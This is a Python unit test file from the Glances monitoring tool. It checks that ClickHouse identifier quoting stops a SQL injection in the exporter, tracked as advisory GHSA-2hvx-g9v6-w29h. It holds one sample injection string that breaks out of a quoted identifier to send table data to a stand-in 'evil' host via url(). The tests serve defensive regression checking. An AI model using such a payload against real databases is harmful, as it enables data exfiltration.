#!/usr/bin/env python
#
# Glances - An eye on your system
#
# SPDX-FileCopyrightText: 2026 Nicolas Hennion <nicolas@nicolargo.com>
#
# SPDX-License-Identifier: LGPL-3.0-only
#

"""Glances unit tests for ClickHouse export SQL injection prevention (GHSA-2hvx-g9v6-w29h).

Tests cover:
- quote_identifier properly escapes ClickHouse identifiers (backtick escaping)
"""

import pytest

try:
    import clickhouse_connect  # noqa: F401
except ImportError:
    pytest.skip("clickhouse_connect not installed", allow_module_level=True)

from clickhouse_connect.driver.binding import quote_identifier

# Payload that, without quoting, would break out of the backtick-quoted identifier
# and turn the CREATE TABLE into an OOB exfiltration query (ClickHouse url()).
INJECTION = "x` ENGINE = MergeTree() AS SELECT * FROM url('http://evil"


# ---------------------------------------------------------------------------
# Tests – quote_identifier (the escaping primitive used by the exporter)
# ---------------------------------------------------------------------------


class TestQuoteIdentifier:
    """The exporter relies on clickhouse_connect.quote_identifier."""

    def test_simple_name_unchanged(self):
        # A legitimate psutil field name is quoted identically to the previous
        # f"`{key}`" format -> no regression on the insert column_names parsing.
        assert quote_identifier('cpu_user') == '`cpu_user`'

    def test_backtick_is_escaped(self):
        quoted = quote_identifier(INJECTION)
        # Result is a single backtick-quoted identifier; the embedded backtick
        # is escaped, so the injected SQL cannot break out.
        assert quoted.startswith('`') and quoted.endswith('`')
        assert '\\`' in quoted
        # The naive/vulnerable format would have contained a bare closing backtick
        # followed by the payload; it must NOT appear as-is.
        assert '`x` ENGINE' not in quoted
